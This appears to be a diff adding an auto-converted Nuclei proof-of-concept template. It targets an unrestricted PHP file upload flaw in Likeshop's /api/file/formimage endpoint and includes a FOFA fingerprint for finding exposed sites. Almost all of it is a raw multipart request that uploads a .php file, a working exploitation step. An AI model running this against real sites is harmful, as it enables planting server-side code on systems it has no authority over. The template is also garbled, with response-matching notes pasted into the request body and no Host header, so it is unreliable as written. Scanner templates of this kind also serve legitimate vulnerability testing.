@@ -1,0 +1,62 @@
+id: poc-zhf4rek87u8iaczv
+info:
+  name: Likeshop HTTP POST 请求 File.php userFormImage 无限制上传漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zhf4rek87u8iaczv'
+  tags: other,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: zhf4rek87u8iaczv
+    fofa: icon_hash="874152924"
+http:
+- raw:
+  - 'POST /api/file/formimage HTTP/1.1
+
+
+    Connection: close
+
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundarygcflwtei
+
+
+    Accept-Encoding: gzip
+
+
+
+
+    ------WebKitFormBoundarygcflwtei
+
+
+    Content-Disposition: form-data; name="file";filename="dudesuite.php"
+
+
+    Content-Type: application/x-php
+
+
+
+
+    dudesuite
+
+
+    ------WebKitFormBoundarygcflwtei--
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    dudesuite
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
